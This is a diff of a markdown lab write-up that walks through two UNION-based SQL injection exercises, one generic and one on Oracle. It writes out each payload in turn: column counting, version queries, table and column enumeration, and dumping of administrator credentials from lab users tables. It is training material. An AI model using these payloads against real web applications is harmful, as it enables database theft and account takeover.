@@ -231,7 +231,138 @@ Lets try to get the version the database is running, we can use the query
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c2c24f3-0b28-422e-bfde-a78afceacc68)
 
-Now, lets check the name of the database
+Now, lets check the name of the tables in the database. We can use the query
+```
+' UNION SELECT table_name,null FROM information_schema.tables--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f027d2a4-0b2b-4abd-a750-168372eaa2fd)
+
+We found a table ```users_vqdnay```.
+
+Next thing to do is to check the name of the columns in the table, we can use the query
+```
+' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_vqdnay'--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e884a31-5c98-4818-9ca8-22dc60184c43)
+
+We got the columns ```username_dgcaur``` and ```password_eygubt```.
+
+Cool, lets dump the contents of the columns using the query
+```
+' UNION SELECT username_dgcaur,password_eygubt FROM users_vqdnay--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2d0f4291-5858-4a65-a5ac-6936bdad6c32)
+
+We got the credentials for the administrator user
+
+username:```administrator```          password:```7ocf0wre9y16c1llsdp1```
+
+Lets go ahead and log in
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5c976ef-a3bf-48ee-9c21-fe5f8c47832f)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6dbc4baf-367b-4b2b-a3f3-adda3da1aeca)
+
+Nice, we have succesfully completed the task for this lab.
+
+---------------------------
+
+# SQL injection attack, listing the database contents on Oracle
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7465f61f-7882-4c1b-8bca-6804b4324362)
+
+Navigate to the webpage and click on "Gifts"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3fb15da-dd80-4081-930e-49c1266812a7)
+
+Capturing this request on burpsuite and sending it over to burp repeater,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbba3330-c8f3-435b-acaa-b11ccc594079)
+
+Lets start out by checking the amount of columns available in the database. We can use the queries
+```
+' order by 1--
+' order by 2--
+' order by 3--
+```
+Ensure the queries are url encoded before applying them
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2edb3a2-1217-45d6-bd92-f0f04e0e17df)
+
+This means we have a column available in the database
+
+Moving on, 
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb6896d2-8423-4d82-9f51-310262faf277)
+
+Now, this means we have 2 columns available in the database
+
+Moving on,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22478a20-b1c2-47ad-bfea-4bc003391a4d)
+
+The "Internal Server Error" means that there isn't a third column available in the database.
+
+Lets check the version the database is running using the query
+```
+' UNION SELECT banner,null FROM v$version--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b01f6263-e68a-422f-868b-1deede320ec5)
+
+Cool, we were able to get the version the database is running.
+
+To get the name of the tables in the database, we can use the query
+```
+' UNION SELECT table_name,null FROM all_tables--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e91fdbe-a352-4f1d-8e76-f2c43f9343e9)
+
+We found the table name ```USERS_DHHSSL```
+
+The next thing to do is check the name of columns available in the table. We can do that using the query
+```
+' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_DHHSSL'--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/184e3392-f394-4214-b2aa-082e4151600c)
+
+We got the column names ```USERNAME_ZTMDCJ``` and ```PASSWORD_QGFLBW```.
+
+Now, lets go ahead and dump the contents of the columns using the query
+```
+' UNION SELECT USERNAME_ZTMDCJ,PASSWORD_QGFLBW FROM USERS_DHHSSL--
+```
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2fe705e-0b88-47fc-9da8-1d61b0278d1b)
+
+We got the creds for the administrator user
+
+username:```administrator```          password:```8aqefrxiudrdaqkhk3qf```
+
+Lets go ahead and login as the administrator user
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90028565-b596-46bd-a8bd-5f21c86faf87)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6df244bc-a9f2-4fd7-b3f6-7b99e663f298)
+
+Cool stuff, we have successfully completed the task for this lab.
+
+--------------------
+
+#
 
 
 
